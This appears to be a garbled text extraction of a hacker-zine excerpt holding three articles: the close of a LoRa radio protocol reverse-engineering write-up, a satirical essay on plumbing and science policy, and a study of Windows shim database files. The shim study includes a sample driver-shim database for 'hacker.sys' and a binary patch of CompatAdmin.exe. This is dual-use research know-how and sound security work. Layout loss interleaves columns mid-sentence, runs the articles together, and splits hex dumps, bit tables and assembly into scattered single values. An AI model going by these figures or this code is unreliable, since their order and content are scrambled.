1
0
1
1
1
0
1
1
0
1
1
1
1
Top
1
0
0
1
1
0
0
1
B
1
0
0
0
0
0
0
1
0
0
0
0
1
0
0
1
0
1
0
0
0
1
1
1
0
0
1
0
0
0
0
1
0
1
1
1
0
1
1
1
1
1
0
1
0
1
1
1
0
1
1
0
1
1
1
1
Top
1
0
0
1
1
0
0
1
Six of the eight diagonals resemble the data em-
bedded into each of the expected FEC encoded code-
words! As for the first and fifth codewords, it is
possible they were damaged during transmission, or
that the derived whitening sequence used for those
positions is not exact. That is where FEC proves its
mettle – applying Hamming(8,4) FEC would repair
any single bit errors that occurred in transmission.
The Hamming parity bits that are expected with
each codeword are calculated using the Hamming
FEC algorithm, or can be looked up for standard
schemes like Hamming(7,4) or Hamming(8,4).
Reading out the mapped diagonals results in the
following table.
T
1
0
0
1
1
0
0
1
0
0
0
0
1
0
0
1
And then have a look at the last nybble for each
of the highlighted codewords:
1 Payload : 0xDEADBEEF
b i t 76543210
3
00110011
10111110
5
11111010
11011101
7
10000010
10000111
9
11000000
10000010
D
E
A
D
B
E
E
F
B
1
0
0
0
0
0
0
1
2 0xD
0xE
4 0xA
0xD
6 0xB
0xE
8 0xE
0xF
57
Data ( 8 , 4 )
1101
1110
1010
1101
1011
1110
1110
1111
Parity Bits
1000
0001
1010
1000
0100
0001
0001
1111header, and the Microchip LoRa module I’ve used
to generate LoRa traffic does not expose the option
of disabling the header. Thus I cannot zero those
bits out to calculate the whitening sequence applied
to it. It should be straightforward to fill in with the
correct hardware in hand.
While the most standard Hamming(8,4) bit or-
der is: p1, p2, d1, p3, d2, d3, d4, p4 (where p are
parity bits and d are data bits), after recognizing the
above data values we can infer that the parity bits
are in a nonstandard order. Looking at the diago-
nal codeword table and the expected Hamming(8,4)
encodings together, we can map the actual bit posi-
tions:
D
E
A
D
B
E
E
F
Bot
p1
1
0
0
0
0
0
0
1
p2
0
0
0
0
1
0
0
1
p4
0
1
0
0
0
1
1
1
p3
0
0
1
0
0
0
0
1
d1
0
1
1
1
0
1
1
1
d2
1
1
0
1
0
1
1
1
d3
0
1
1
0
1
1
1
1
The PHY header and service data unit/payload
CRCs have not been investigated for the same rea-
son. This should be easy to resolve through the use
of a tool like CRC RevEng once the header is known.
Top
d4
1
0
0
1
1
0
0
1
In my experience, for demodulation purposes
clock recovery has not been necessary beyond get-
ting an accurate initial sync on the SFD. However
should clock drift pose a problem, for example if
transmitting longer messages or using higher spread-
ing factors which have slower data rates/longer over-
the-air transmission times, clock recovery may be
desirable.
Note that parity bits three and four are swapped.
With that resolved, we can use the parity bits to de-
code the forward error correction, resulting in four
bits being corrected, as shown in Figure 14.
That’s LoRa!
–——–
———
—–—–
Having reversed the protocol, it is important to
look back and reflect on how and why this worked.
As it turned out, being able to make assumptions
and inferences about certain goings-on was crucial
for bounding the problem and iteratively verify-
ing components and solving for unknowns. Recall
that by effectively canceling out interleaving and
forward error correction, I was able to effectively
split the problem in two. This enabled me to solve
for whitening, even though “gray indexing” was un-
known there were only three permutations, and with
that in hand, I was able to solve for the interleaver,
since FEC was understood to some extent. Just like
algebra or any other scientific inquiry, it comes down
to controlling your variables. By stepping through
the problem methodically and making the right in-
ferences, we were able to reduce 4 independent vari-
ables to 1, solve for it, and then plug that back in
and solve for the rest.
7.6
7.7
Shameless Plug
I recently published an open source GNU Radio
OOT module that implements a transceiver based
on this derived version of the LoRa PHY. It is pre-
sented to empower RF and security researchers to
investigate this nascent protocol. 25
Remaining Work
While the aforementioned process represents a com-
prehensive description of the PHY, there are a few
pieces that will be filled in over time.
The LoRa PHY contains an optional header with
its own checksum. I have not yet reversed the
25 git clone https://github.com/BastilleResearch/gr-lora
unzip pocorgtfo13.pdf gr-lora.tar.bz2
58Top
D
E
A
D
B
E
E
F
p1
1
0
1
1
0
0
0
1
p2
0
0
0
0
1
0
0
1
p4
0
1
0
0
0
1
1
1
p3
0
0
1
0
0
0
0
1
d1
1
1
1
1
1
1
1
1
d2
1
1
0
1
0
1
1
1
d3
0
1
1
0
1
1
1
1
d4
1
0
0
1
1
0
0
1
1101
1110
1010
1101
1011
1110
1110
1111
=
=
=
=
=
=
=
=
0xD
0xE
0xA
0xD
0xB
0xE
0xE
0xF
Figure 14. Forward Error Corrected bits shown in bold
7.8
Conclusions and Key Takeaways
Presented here is the process that resulted in a com-
prehensive deconstruction of the LoRa PHY layer,
and the details one would need to implement the
protocol. Beyond that, however, is a testament to
the challenges posed by red herrings (or three of
them, all at once) encountered throughout the re-
verse engineering process. While open source in-
telligence and documentation can be a boon to re-
searchers – and make no mistake, it was enormously
helpful in debunking LoRa – one must remember
that even the most authentic sources may sometimes
lie!
Another point to take away from this is the im-
portance of bounding problems as you solve them,
including through making informed inferences in the
absence of perfect information. This of course must
be balanced with the first point about OSINT, is
knowing when to walk away from a source. How-
ever as illustrated above, drawing appropriate con-
clusions proved integral to reducing and solving for
each of the decoding elements within a black-box
methodology.
The final thought I will leave you with is that
wireless doesn’t just mean Wi-Fi anymore - it in-
cludes cellular, PANs, LPWANs, and everything in
between. Accordingly, a friendly reminder that se-
curity monitoring and test tools don’t exist until
someone creates them. Monitor mode and Wire-
shark weren’t always a thing, so don’t take them
for granted: it’s time to make the next generation
of wireless networks visible to researchers, because
know it or not it is already here and is here to stay.
598
Plumbing, not Popper;
or, the Problem with STEP
by Pastor Manul Laphroaig
study with a plumber, attach oneself to a plumber,
and do what a plumber does for a while. This, neigh-
bors, is how deep the plumbing magic goes.
Science, alas, has not been so lucky.
–——–
———
—–—–
It is fashionable to talk about how we need more
scientists, and how we can direct and improve sci-
ence, quoting grand theories that explain science,
while similarly educated people nod approvingly.
After all, they all know what science is, as befits
all forward-thinking people these days. No one feels
awkward; everyone feels good.
Perhaps this happens because our social betters
all experienced helplessness at the sight of broken
plumbing, but would not recognize broken science,
much less a hopelessly broken science textbook. You
see, science lab equipment is OK with a patroniz-
ing, self-satisfied gaze, whereas plumbing has a way
of glaring back contemptuously, daring you to use
your general theoretical understanding.
Gather round, neighbors. We are going to a mag-
ical place. One that we hardly ever notice in our
busy lives, but which has a way of taking over your
entire day when you are forced to visit it. We are
going on a trip to the plumbing closet! 26
Look at the miracle that is the clump of pipes,
looking right back at you. Its message is clear: do
not approach without skill, unless you like wet, gi-
gantic messes. This message is universal: it speaks
to a politician, a professor, an NYT columnist, a
movie actor, and a hedge fund manager alike. It
transcends languages and beliefs.
Even though these worthies and civic leaders
might agree the country could use more plumbers,
it has not yet occurred to them to approach the
problem by putting a big P into some popular slo-
gan like “STEP” (Science, Technology, Engineering,
Plumbing), by setting up a federal Department of
Plumbing, or by lionizing a professional coveralls-
wearer TV personality who goes by “A Plumbing
Guy,” despite never having fixed a pipe in his life.
They somehow know that these things will do
diddly squat to address the shortage of plumbers.
They know deep down that to learn plumbing—and
even to not sound ridiculous about it—one needs to
With plumbing, it’s either practical skill or
a huge mess in your basement. Messing with
how plumbers learn and teach this skill guarantees
messes in thousands of basements. If you value your
plumbing, it’s wise to leave plumbers alone even if
you believe every word of every newspaper column
you’ve ever read on plumbing economy.
It may be a surprise to the readers of Karl Pop-
per and Imre Lakatos 27 that actual scientists are
helped by philosophy of science in exactly the same
way as plumbers are helped by the Zen of Plumb-
ing. Although these very same people are likely to
believe they understand plumbing too, they usually
have the sense to leave the plumbing profession well
alone, and not apply their philosophical understand-
ings to it—being empirically familiar with the fact
that when you need plumbing done, philosophy is
useless; only the skill stands between the water in
your pipes and your expensive library.
–——–
———
—–—–
26 For those of you fortunate to own a house, it’s probably in the corner of your basement, an equally magical place, whence
all science and innovation springs forth—but let us not digress.
27 Lakatos the philosopher is considered to be a great intellectual authority. For what it’s worth, you might also want to read
about how he applied his philosophy in real life: unzip pocorgtfo13 freudenthal.pdf
6061results are immediate and obvious. When learned
committees do the professional equivalent thereof to
math textbooks and call it nice names like “Discov-
ery Math,” “Common Core,” or “Critical Thinking”
it takes a generation to notice, and then we wonder—
how on earth did school math become unteachable
and unlearnable? 28
Plumbers have wisely avoided it, perhaps due to
some secret wisdom passed from master to appren-
tice through the ages. Scientists, I am sorry to say,
walked right into it around the middle of the twen-
tieth century.
Sure enough, national agencies got us to the
moon—but it seems that all the good science school-
books have been put on the rockets going there,
never to return. Have you met many scientists who
are happy with what schools do to their sciences
after half a century of being improved by various
government offices?
Funny how it worked out for scientists. Now hear
them complain about “publish or perish,” the rapidly
rising age at which one finally succeeds in getting
one’s first grant, and the relentless race to rebrand
and follow the current big-ticket grant programs. 29
But don’t blame them, neighbors; it was their
advisors or their advisors’ advisors who fell for it.
Better to buy them a drink, and remember their
lesson.
Better yet, find some plumbers, and buy them
drinks. Perhaps they’ll share with you some of their
secrets of how to keep the philosophers and their
educated and benevolent readers interested in the
result, but at a safe distance from the actual plumb-
ing.
By far the worst hit to a profession is delivered
when a part of the professionals actually welcomes
philosophers lauding it, politicians bearing gifts and
grants, and governments setting up departments to
promote it. Forms to fill, ever-growing grant appli-
cation paperwork, pervasive “performance metrics,”
and having to explain basic fallacies to the well-
meaning but fundamentally ignorant and hugely
powerful committees come later—and accumulate.
In the context of metrics, charlatans always win, be-
cause they don’t get distracted by trying for actual
results.
Not to mention that the money that goes to char-
latans is not net-neutral for actual plumbing (or sci-
ence); it is net-negative, because charlatans have a
way of making the lives of professionals hard where
it hurts the most. When Tim “the Tool Man” Tay-
lor waves power tools around with a swagger, the
28 We sort of know the answer, neighbors: a roller coaster of reforms and unintelligible standards created a generation of math
teachers for whom math did not have to make sense. unzip pocorgtfo13.pdf wu-preparing-teachers.pdf and read it. It may
apply to whatever else you hold dear.
29 According to Ronald J. Daniels, President of Baltimore’s Johns Hopkins University, no less than the whole generation
is at risk: “A generation at risk: Young investigators and the future of the biomedical workforce.” (unzip pocorgtfo13.pdf
atrisk.pdf.) For more of this, read “Science in the Age of Selfies” by Donald Geman, Stuart Geman. (selfies.pdf.) It’s hard
to make these things up, neighbors.
629
Where is ShimDBC.exe?
by Geoff Chappell
9.1
Microsoft’s Shim Database Compiler might be a
legend . . . except that nobody seems ever to have
made any story of it. It might be mythical . . . ex-
cept that it actually does exist. Indeed, it has been
around for 15 years in more or less plain sight. Yet
if you ask Google to search the Internet for occur-
rences of shimdbc, and especially of “shimdbc.exe”
in quotes, you get either remarkably little or a tan-
talising hint, depending on your perspective.
Application Compatibility?
There can’t be anything more boring in the whole
of Windows, you may think. I certainly used to,
and might still for applications if I cared enough,
but Windows 8 brought Application Compatibility
to kernel mode in a whole new way, and this I do
care about.
The integrity of any kernel-mode driver that you
or I write nowadays depends on what anyone else,
well-meaning or not, can get into the DRVMAIN.SDB
file in the AppPatch subdirectory of the Windows
installation. This particular Shim Database file ex-
ists in earlier Windows versions too, but only to list
drivers that the kernel is not to load. If you’re the
writer of a driver, there’s nothing you can do at run-
time about your driver being blocked from loading,
and in some sense you’re not even affected: you’re
not loaded and that’s that. Starting with Win-
dows 8, however, the DRVMAIN.SDB file defines the
installed shim providers and either the registry or
the file can associate your driver with one or more of
these defined shim providers. When your driver gets
loaded, the applicable shim providers get loaded too,
if they are not already, and before long your driver’s
image in memory has been patched, both for how it
calls out through its Import Address Table and how
it gets called, e.g., to handle I/O requests.
In this brave new world, is your driver really
your driver? You might hope that Microsoft would
at least give you the tools to find out, if only so
that you can establish that a reported problem with
your driver really is with your driver. After all,
for the analogous shimming, patching, and what-
ever of applications, Microsoft has long provided an
Application Compatibility Toolkit (ACT), recently
re-branded as the Windows Assessment and Deploy-
ment Kit (ADK). The plausible thoroughness of this
kit’s Compatibility Administrator in presenting a
tree view of the details is much of the reason that
I, for one, regarded the topic as offering, at best,
slim pickings for research. For the driver database,
however, this kit does nothing—well, except to leave
me thinking that the SDB file format and the API
support through which SDB files get interpreted,
created, and might be edited, are now questions I
should want to answer for myself rather than imag-
Mostly, you get those scam sites that have pre-
pared a page for seemingly every executable that
has ever existed and can fix it for you if only you
will please download their repair tool. But amongst
this dross is a page from Microsoft’s TechNet site.
Google excerpts that “QFixApp uses the support
utility ShimDBC.exe to test the group of selected
fixes.” Follow the link and you get to one of those
relatively extensive pages that Microsoft sometimes
writes to sketch a new feature for system adminis-
trators and advanced users (if not also to pat them-
selves on the back for the great new work). This
page is from 2001 and is titled Windows XP Appli-
cation Compatibility Technologies. 30
30 https://technet.microsoft.com/library/bb457032.aspx
63ine they’ve already been answered well by whoever
managed somehow to care about Application Com-
patibility all along.
9.2
e.g., as word, dword, binary, or Unicode string—
all of which can be gleaned from Microsoft’s admit-
tedly terse documentation of those API functions—
you might think to reorganise the raw dump so that
it retains every byte but more conveniently shows
the hierarchy of tags, each with their TAG, size (if
explicit) and data (if present). A decoding of Fig-
ure 15 is shown in Figure 16.
The SDB File Format
Relax! I’m not taking you to the depths of Applica-
tion Compatibility, not even just for what’s specific
to driver shims. Our topic here is reverse engineer-
ing. Now that you know what these SDB files are
and why we might care to know what’s in them,
I expect that if you have no interest at all in Ap-
plication Compatibility, you can treat this part of
this article as using SDB files just as an example
for some general concerns about how we present
reverse-engineered file formats. (And please don’t
skip ahead, but I promise that the final part is pretty
much nothing but ugly hackery.)
Let’s work even more specifically with just one
example of an SDB file, shown in Figure 15. It’s a
little long, despite being nearly minimal. It defines
one driver shim but no drivers to which this shim is
to be applied.
Although Microsoft has not documented the
SDB file format, Microsoft has documented a se-
lection of API functions that work with SDB files,
which is in some ways preferable. Perhaps by look-
ing at these functions researchers and reverse engi-
neers have come to know at least something of the
file format, as evidenced by various tools they have
published which interpret SDB files one way or an-
other, typically as XML.
As a rough summary, an SDB file has a 3-dword
header, for a major version, minor version, and sig-
nature, and the rest of the file is a list of variable-size
tags which each have three parts:
To manually verify that everything in the file is
exactly as it should be, there is perhaps no better
representation to work from than one that retains
every byte. In practice, though, you’ll want some
interpretation. Indeed, the dump above does this
already for the tags whose high 4 bits are 6. The
data for any such tag is a string reference, specifi-
cally the offset of a 0x8801 tag within the 0x7801
tag (at offset 0x0142 in this example), and an auto-
mated dump can save you a little trouble by show-
ing the offset’s conversion to the string. Since those
numbers for tags soon become tedious, you may pre-
fer to name them. The names that Microsoft uses
in its programming are documented for the roughly
100 tags that were defined ten years ago (for Win-
dows Vista). All tags, documented or not (and now
running to 260), have friendly names that can be ob-
tained from the API function SdbTagToString. If
you haven’t suspected all along that Microsoft pre-
pares SDB files from XML input, then you’ll likely
take “tag” as a hint to represent an SDB file’s tags
as XML tags. And this, give or take, is where some
of the dumping tools you can find on the Internet
leave things, such as in Figure 17.
Notice already that choices are made about what
to show and how. If you don’t show the offset in
bytes that each XML tag has as an SDB tag in the
original SDB file, then you risk complicating your
presentation of data, as with the string references,
whose interpretation depends on those file offsets.
But show the offsets and your XML quickly looks
messy. Once your editorial choices go so far that you
don’t reproduce every byte but instead build more
and more interpretation into the XML, why show
every tag? Notably, the string table that’s the data
for tag 0x7801 (TAG_STRINGTABLE) and the indexes
that are the data for tag 0x7802 (TAG_INDEXES)
must be generated automatically from the data for
tag 0x7001 (TAG_DATABASE) such that the last may
be all you want to bother with. Observe that for any
tag that has children, the subtags that don’t have
children come first, and perhaps you’ll plumb for a
different style of XML in which each tag that has no
1. a 16-bit TAG, whose numerical value tells of the
tag’s type and purpose;
2. a size in bytes, which can be given explicitly as
a dword or may be implied by the high 4 bits
of the TAG;
3. and then that many bytes of data, whose in-
terpretation depends on the TAG.
Importantly for the power of the file format, the
data for some tags (the ones whose high 4 bits are
7) is itself a list of tags. From this summary and a
few details about the recognised TAG values, the im-
plied sizes and the general interpretation of the data,
6400000000:
00000010:
00000020:
00000030:
00000040:
00000050:
00000060:
00000070:
00000080:
00000090:
000000A0:
000000B0:
000000C0:
000000D0:
000000E0:
000000F0:
00000100:
00000110:
00000120:
00000130:
00000140:
00000150:
00000160:
00000170:
00000180:
00000190:
000001A0:
000001B0:
000001C0:
02
00
16
00
03
00
01
14
00
1A
00
16
00
00
00
00
10
70
10
01
00
2E
2E
20
44
00
65
63
00
00
00
40
00
78
00
60
00
00
70
00
40
00
00
00
00
00
E1
90
32
00
00
00
00
00
00
00
00
00
00
03
01
02
0E
00
16
00
01
03
03
02
02
52
01
01
00
12
10
B0
01
31
00
44
61
01
72
6B
..
00
78
00
38
00
00
40
00
98
38
78
00
38
45
50
60
00
EF
00
63
78
00
00
00
00
88
00
00
01
14
00
17
00
03
02
02
00
01
14
00
25
4B
D8
1C
28
25
00
94
7A
2E
48
72
74
0E
00
65
00
00
00
70
00
78
00
38
00
60
00
00
70
43
C1
00
22
70
00
ED
00
00
00
00
00
00
00
00
00
00
01
03
02
14
00
1C
00
16
00
01
03
41
31
00
AB
28
C8
17
00
30
61
69
61
00
01
72
00-73
00-02
98-00
38-01
38-07
00-00
00-01
70-03
00-03
40-02
00-02
98-00
38-01
48-14
3C-70
00-23
F9-12
00-00
E4-9C
40-03
00-01
00-2E
00-63
00-76
00-62
00-48
88-16
00-2E
64
38
00
60
70
00
98
38
78
00
38
00
60
01
10
40
33
00
91
00
88
00
00
00
00
00
00
00
62
07
00
01
03
02
00
0B
14
00
1A
00
01
00
D2
01
73
01
69
00
10
33
6B
65
61
61
00
73
66
70
00
98
38
38
00
60
00
00
70
00
98
00
01
00
4A
60
D0
00
00
00
00
00
00
00
00
00
02
03
03
00
04
1C
00
16
00
01
03
03
0C
01
22
00
B6
50
21
03
00
00
65
72
73
63
68
79
78
38
78
00
90
70
00
40
00
98
38
78
00
70
60
00
F9
00
45
60
00
00
00
00
00
00
00
00
CA
01
0E
00
01
03
03
02
02
00
0B
1A
00
60
06
07
93
00
A5
64
32
01
64
20
65
6B
61
73
00
60
00
00
98
38
78
00
38
00
60
00
00
00
00
90
6D
00
45
00
00
88
00
00
00
00
00
00
........sdbf.x..
...x.....8.p.8.‘
.@...........x..
...8.p.8.‘......
.x.....8.p.8....
.....x.....8.p.8
.‘.@...........x
.....8.p.8.‘.@..
.........x.....8
.p.8.‘.@........
...x.....8.p.8.‘
.@...........x..
...8%p.8.‘......
..REKCAH.....p‘.
...P..1<p..."‘..
...‘....#@......
....("...3sJ...m
p...%p(....‘P...
..........i.!E.E
.2.c...@.....‘d.
...xz.........2.
..1...0...3.....
....H.a.c.k.e.d.
.D.r.i.v.e.r. .
D.a.t.a.b.a.s.e.
........H.a.c.k.
e.r.........h.a.
c.k.e.r...s.y.s.
Figure 15. ShimDB File
that you know it’s a Windows FILETIME and present
it as 16/09/2016 23:15:37.944? Or, on the grounds
that it too must be generated automatically, you
might decide not to show it at all!
child tags is represented as an attribute and value,
e.g.,
2
4
6
8
10
12
< DATABASE
TIME =" 0 x01D210703C31C1D8 "
COMPILER_VERSION =" 2 . 1 . 0 . 3 "
NAME =" Hacked D r i v e r Database "
OS_PLATFORM =" 0 x 00 000 00 1 "
DATABASE_ID =" 0 x28 0 x22 0xAB 0xF9 0 x12 0 x33
0 x73 0x4A 0xB6 0xF9 0 x93 0x6D 0 x70 0xE1 0
x12 0xEF">
< KSHIM
NAME =" Hacker "
FIX_ID=" 0xC8 0xE4 0x9C 0 x91 0 x69 0xD0 0
x21 0 x45 0xA5 0 x45 0 x01 0 x32 0xB0 0 x63 0
x94 0xED"
FLAGS =" 0 x 00 000 00 3 "
MODULE =" h a c k e r . s y s " />
</DATABASE >
If I labour the presentation, it’s to make the
point that what’s produced by any number of dump-
ing tools inevitably varies according to purpose and
taste. Let’s say a hundred researchers want a tool
for the easy reading of SDB files. Yes, that’s doubt-
ful, but 100 is a good round number. Then ninety
will try to crib code from someone else—because,
you know, who wants to reinvent the wheel—and
what you get from the others will each be different,
possibly very different, not just for its output but
especially for what the source code shows of the file
format. Worse, because nine out of ten program-
mers don’t bother much with commenting, even for
a tool they may intend as showing off their cod-
ing skills, you may have to pick through the source
code to extract the file format. That may be easier
than reverse-engineering Microsoft’s binaries that
work with the file, but not necessarily by much—and
not necessarily leaving you with the same confidence
that what you’ve learnt about the file format is cor-
Whether you choose XML in this style or to have
every tag’s data between opening and closing tags,
there are any number of ways to represent the data
for each tag. For instance, once you know that
the binary data for tag 0x9007 (TAG_DATABASE_ID)
or tag 0x9010 (TAG_FIX_ID) is always a GUID, you
might more conveniently represent it in the usual
string form. Instead of showing the data for tag
0x5001 (TAG_TIME) as a raw qword, why not show
6500000000:
0000000C:
00000012:
00000018:
0000001C:
00000020:
00000026:
0000002C:
00000032:
00000036:
0000003A:
00000040:
.
. Header: MajorVersion=0x00000002 MinorVersion=0x00000001 Magic=0x66626473
Tag=0x7802 Size=0x000000CA Data=
Tag=0x7803 Size=0x00000014 Data=
Tag=0x3802 Data=0x7007
Tag=0x3803 Data=0x6001
Tag=0x4016 Data=0x00000001
Tag=0x9801 Size=0x00000000
Tag=0x7803 Size=0x0000000E Data=
Tag=0x3802 Data=0x7017
Tag=0x3803 Data=0x6001
Tag=0x9801 Size=0x00000000
Tag=0x7803 Size=0x0000000E Data=
000000BC:
000000C2:
000000C6:
000000CA:
000000DC:
000000E2:
000000EC:
000000F2:
000000F8:
000000FE: Tag=0x7803 Size=0x0000001A Data=
Tag=0x3802 Data=0x7025
Tag=0x3803 Data=0x6001
Tag=0x9801 Size=0x0000000C Data=0x00 0x00 0x52 0x45 0x4B 0x43 0x41 0x48 0x14 0x01 0x00 0x00
Tag=0x7001 Size=0x00000060
Tag=0x5001 Data=0x01D210703C31C1D8
Tag=0x6022 Data=0x00000006 => L"2.1.0.3"
Tag=0x6001 Data=0x0000001C => L"Hacked Driver Database"
Tag=0x4023 Data=0x00000001
Tag=0x9007 Size=0x00000010 Data=0x28 0x22 0xAB 0xF9 0x12 0x33 0x73 0x4A 0xB6 0xF9 0x93 0x6D
0x70 0xE1 0x12 0xEF
Tag=0x7025 Size=0x00000028
Tag=0x6001 Data=0x00000050 => L"Hacker"
Tag=0x9010 Size=0x00000010 Data=0xC8 0xE4 0x9C 0x91 0x69 0xD0 0x21 0x45 0xA5 0x45 0x01 0x32
0xB0 0x63 0x94 0xED
Tag=0x4017 Data=0x00000003
Tag=0x6003 Data=0x00000064 => L"hacker.sys"
Tag=0x7801 Size=0x0000007A Data=
Tag=0x8801 Size=0x00000010 Data=L"2.1.0.3"
Tag=0x8801 Size=0x0000002E Data=L"Hacked Driver Database"
Tag=0x8801 Size=0x0000000E Data=L"Hacker"
Tag=0x8801 Size=0x00000016 Data=L"hacker.sys"
00000114:
0000011A:
00000120:
00000136:
0000013A:
00000142:
00000148:
0000015E:
00000192:
000001A6:
Figure 16. ShimDB File (Decoded from Figure 15)
661 <INDEXES >
< INDEX >
3
< INDEX_TAG >0 x7007</INDEX_TAG >
< INDEX_KEY >0 x6001</INDEX_KEY >
5
< INDEX_FLAGS >0 x0 000 00 01</INDEX_FLAGS >
<INDEX_BITS ></INDEX_BITS >
7
</INDEX >
< INDEX >
9
< INDEX_TAG >0 x7017</INDEX_TAG >
< INDEX_KEY >0 x6001</INDEX_KEY >
11
<INDEX_BITS ></INDEX_BITS >
</INDEX >
13
...
< INDEX >
15
< INDEX_TAG >0 x7025</INDEX_TAG >
< INDEX_KEY >0 x6001</INDEX_KEY >
17
<INDEX_BITS >0 x00 0 x00 0 x52 0 x45 0x4B 0 x43 0 x41 0 x48 0 x14 0 x01 0 x00 0 x00</INDEX_BITS >
</INDEX >
19 </INDEXES >
< DATABASE >
21
< TIME >0 x01D210703C31C1D8</TIME >
< COMPILER_VERSION >0 x0 000 00 06</COMPILER_VERSION >
23
< NAME >0 x0000001C</ NAME >
< OS_PLATFORM >0 x00 00 00 01</OS_PLATFORM >
25
< DATABASE_ID >0 x28 0 x22 0xAB 0xF9 0 x12 0 x33 0 x73 0x4A 0xB6 0xF9 0 x93 0x6D 0 x70 0xE1 0 x12 0xEF</
DATABASE_ID >
< KSHIM >
27
< NAME >0 x0 000 00 50</ NAME >
<FIX_ID >0xC8 0xE4 0x9C 0 x91 0 x69 0xD0 0 x21 0 x45 0xA5 0 x45 0 x01 0 x32 0xB0 0 x63 0 x94 0xED</
FIX_ID >
29
< FLAGS >0 x0 000 00 03</FLAGS >
< MODULE >0 x00 00 00 64</MODULE >
31
</KSHIM >
</DATABASE >
33 < STRINGTABLE >
< STRINGTABLE_ITEM > 2 . 1 . 0 . 3</STRINGTABLE_ITEM >
35
< STRINGTABLE_ITEM >Hacked D r i v e r Database</STRINGTABLE_ITEM >
< STRINGTABLE_ITEM >Hacker</STRINGTABLE_ITEM >
37
< STRINGTABLE_ITEM >h a c k e r . s y s</STRINGTABLE_ITEM >
</STRINGTABLE >
Figure 17. Illegible XML From a ShimDB Dumping Tool
67rect and comprehensive. Writing a tool that dumps
an undocumented file format may be more reward-
ing for you as a programmer but it is not nearly the
same as documenting the file format.
9.3
some other possibly useful or at least instructive
tools such as GrabMI.exe, but you don’t get any
file named ShimDBC.exe. I suspect that Shim-
DBC.exe never has existed in public as any sort of
self-standing utility or even as its own file. Even if
it did once upon a time, we should want a modern
version that knows the modern tags such as 0x7025
(TAG_KSHIM) for defining driver shims.
For some good news, look into either QFix-
App.exe or CompatAdmin.exe using whatever is
your tool of choice for inspecting executables. In-
side each, not as resources but intermingled with the
code and data, are several instances of ShimDBC as
text. We’ve had Microsoft’s Shim Database Com-
piler for 15 years since the release of Windows XP.
All along, the code and data for the console program
ShimDBC.exe, from its wmain function inwards, has
been linked into the GUI programs QFixApp.exe
and CompatAdmin.exe (of which only the latter sur-
vives to modern versions of the ACT). Each of the
GUI programs has a WinMain function that’s first to
execute after the C Run-Time (CRT) initialisation.
Whenever either of the GUI programs wants to cre-
ate an SDB file, it composes the Unicode text of a
command line for the fake ShimDBC.exe and calls a
routine that first parses this into the argc and argv
that are expected for a wmain function and which
then simply calls the wmain function. Where the
TechNet article says QFixApp uses ShimDBC.exe,
it is correct, but it doesn’t mean that QFixApp ex-
ecutes ShimDBC.exe as a separate program, more
that QFixApp simulates such execution from the
ShimDBC code and data that’s built in.
Unfortunately, CompatAdmin does not provide,
even in secret, for passing a command line of our
choice through WinMain to wmain. But, c’mon, we’re
hackers. You’ll already be ahead of me: we can
patch the file. Make a copy of CompatAdmin.exe as
ShimDBC.exe, and use your favourite debugger or
disassembler to find three things:
Reversing XML to SDB
But is there really no definitive XML for repre-
senting SDB files? Of all the purposes that moti-
vate anyone to work with SDB files closely enough
to need to know the file format, one has special
standing: Microsoft’s creation of SDB files from
XML input. If we had Microsoft’s tool for that,
then wouldn’t most researchers plumb for revers-
ing its work to recover the XML source? After
all, most reverse engineers and certainly the popular
reverse-engineering tools don’t take binary code and
unassemble it just to what you see in the debugger.
No, they disassemble it into assembly language that
can be edited and re-assembled. Many go further
and try to decompile it into C or C++ that can be
edited and re-compiled (even if it doesn’t look re-
motely like anything you’d be pleased to have from
a human programmer). In this context, the SDB to
XML conversion to want is something you could feed
to Microsoft’s Shim Database Compiler for compila-
tion back to SDB. Anything else is pseudo-code. It
may be fine in its way for understanding the content,
and some may prefer it to a raw dump interpreted
with reference to documentation of the file format,
but however widely it gets accepted it is nonetheless
pseudo-code.
The existence of something that someone at
Microsoft refers to as a Shim Database Com-
piler has been known for at least a decade be-
cause Microsoft’s documentation of tag 0x6022
(TAG_COMPILER_VERSION), apparently contempora-
neous with Windows Vista, describes this tag’s data
as the “Shim Database Compiler version.” And
what, then, is the ShimDBC.exe from the even older
TechNet article if it’s not this Shim Database Com-
piler?
But has anyone outside Microsoft ever seen this
compiler? Dig out an installation disc for Win-
dows XP from 2001, look in the Support Tools di-
rectory, install the ACT version 2.0 from its self-
extracting executable, and perhaps install the Sup-
port Tools too in case that’s what the TechNet ar-
ticle means by “support utility.” For your troubles,
which may include having to install Windows XP,
you’ll get the article’s QFixApp.exe, and the Com-
patibility Administrator, as CompatAdmin.exe, and
• the program’s WinMain function;
• the routine the program passes the fake com-
mand line to for parsing and for calling wmain;
• the address of the Import Address Table entry
for calling the GetCommandLineW function.
68Ideally, you might then assemble something like
call
2 mov
call
4 ret
I may be alone in this, but if you’re going to
tell me that I should know that you know the SDB
file format when all you have to show is a tool that
converts SDB to XML, then this would better be
the XML that your tool produces from this article’s
example of an SDB file. Otherwise, as far as I’m
concerned for studying any SDB file, I’m better off
with a raw dump in combination with actual docu-
mentation of the file format.
dword p t r [ __imp__GetCommandLineW@0 ]
ecx , eax
SimulateShimDBCExecution
10h
over the very start of WinMain. In practice, you
have to allow for relocations. Our indirect call to
GetCommandLineW will need a fixup if the program
doesn’t get loaded at its preferred address. Worse,
if we overwrite any fixup sites in WinMain, then our
code will get corrupted if fixups get applied. But
these are small chores that are bread and butter for
practised reverse engineers. For concreteness, I give
the patch details for the 32-bit CompatAdmin.exe
from the ACT version 6.1 for Windows 8.1 in Ta-
ble 2.
For hardly any trouble, we get an executable
that still contains all its GUI material (except for
the 17 bytes we’ve changed) but never executes
it and instead runs the console-application code
with the command line that we give when running
the patched program. Microsoft surely has Shim-
DBC.exe as a self-standing console application, but
what we get from patching CompatAdmin.exe must
be close to the next best thing, certainly for so little
effort. It’s still a GUI program, however, so to see
what it writes to standard output we must explicitly
give it a standard output. At a Command Prompt
with administrative privilege, enter
shimdbc -?
Do not let it go unnoticed, though, that the
XML that works for Microsoft’s ShimDBC needs at-
tributes that differ from the programmatic names
that Microsoft has documented for the tags or the
friendly names that can be obtained from the Sdb-
TagToString function. For instance, the 0x6003 tag
(TAG_MODULE) is compiled from an attribute named
not MODULE but FILE. The 0x4017 tag (TAG_FLAGS)
is synthesised from two attributes. Even harder to
have guessed is that a LIBRARY tag is needed in the
XML but does not show at all in the SDB file, i.e.,
as a tag 0x7002 (TAG_LIBRARY). So, to know what
XML is acceptable to Microsoft’s compiler for creat-
ing an SDB file, you’ll have to reverse-engineer the
compiler or do a lot of inspired guesswork.
Happy hunting!
>help.txt
to get the built-in ShimDBC program’s mostly accu-
rate description of its command-line syntax, includ-
